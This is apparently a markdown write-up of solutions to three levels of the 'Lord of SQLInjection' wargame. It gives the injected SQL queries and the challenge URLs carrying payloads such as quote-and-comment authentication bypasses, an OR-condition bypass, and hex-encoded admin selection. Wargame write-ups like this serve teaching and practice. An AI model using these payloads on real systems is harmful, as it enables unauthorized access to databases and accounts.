# Lord of SQLInjection Write-ups

## gremlin

![gremlin](./pic/gremlin.PNG)

query: 
```SQL
select id from prob_gremlin where id='0'||1#' and pw=''
```

https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=0'||1%23

![gremlin](./pwned/gremlin.PNG)

<br>

## cobolt

![cobolt](./pic/cobolt.PNG)

query:
```SQL
select id from prob_cobolt where id='admin'#' and pw=md5('')
```
https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=admin%27%23

![cobolt](./pwned/cobolt.PNG)

<br>

## goblin

![goblin](./pic/goblin.PNG)

query1:
```SQL
select id from prob_goblin where id='guest' and no=0 or no!=1
```
https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=0%20or%20no!=1

query2:
```SQL
select id from prob_goblin where id='guest' and no=0 or ord(id)=97
```
https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=0%20or%20ord(id)=97

query3:
```SQL
select id from prob_goblin where id='guest' and no=0 or id=0x61646d696e
```
https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=0%20or%20id=0x61646d696e

![cobolt](./pwned/goblin.PNG)